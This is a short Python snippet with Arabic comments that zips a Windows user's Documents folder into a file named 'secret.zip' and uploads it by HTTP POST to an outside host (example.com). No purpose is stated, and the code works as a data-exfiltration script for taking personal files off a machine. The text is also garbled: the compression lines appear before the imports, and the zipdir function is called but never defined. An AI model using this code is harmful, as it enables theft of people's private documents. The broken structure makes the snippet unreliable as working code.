z = zipfile.ZipFile(OUTPUT, MODE, zipfile.ZIP_DEFLATED)
zipdir(PATH, z)
z.close()
import zipfile
import os
import requests

OUTPUT = "secret.zip"
PATH = "C:\\Users\\اسم_المستخدم\\Documents"
MODE = "w"

# ضغط الملفات
z = zipfile.ZipFile(OUTPUT, MODE, zipfile.ZIP_DEFLATED)
zipdir(PATH, z)
z.close()

# رفع الملف إلى موقع خارجي
files = {'file': open(OUTPUT, 'rb')}
response = requests.post("http://example.com/upload", files=files)
